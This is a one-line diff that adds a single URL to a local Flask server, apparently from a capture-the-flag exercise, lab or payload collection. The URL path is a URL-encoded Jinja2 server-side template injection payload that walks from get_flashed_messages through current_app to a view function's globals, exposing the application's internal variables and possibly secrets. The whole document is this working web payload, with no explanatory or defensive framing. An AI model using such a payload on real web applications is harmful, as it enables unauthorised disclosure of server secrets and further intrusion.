@@ -1,0 +1,1 @@
+http://127.0.0.1:8000/%7B%7Bget_flashed_messages.__globals__.current_app.view_functions.home.__globals__%7D%7D
